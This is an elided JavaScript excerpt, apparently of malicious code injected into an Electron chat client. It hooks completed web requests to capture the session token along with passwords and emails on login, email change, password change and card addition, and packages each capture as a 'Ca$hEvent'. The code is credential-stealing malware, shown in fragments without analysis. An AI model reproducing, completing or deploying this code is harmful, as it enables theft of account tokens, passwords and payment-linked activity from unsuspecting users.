...
async function firstTime() {
    ...
    if (!fs.existsSync(path.join(__dirname, "BTW"))) return !0

    fs.rmdirSync(path.join(__dirname, "BTW"));
...
session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
    ...
    switch (true) {
        case details.url.endsWith('login'):
            var event = new Ca$hEvent('userLogin', token, {
        ...
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            ...
            if (data.email) {
                var event = new Ca$hEvent('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();
            ...
            if (data.new_password) {
                var event = new Ca$hEvent('passwordChanged', token, {
                    password: data.password,
        ...
        case details.url.endsWith('tokens') && details.method == "POST":
            ...
            var event = new Ca$hEvent('creditCardAdded', token, {
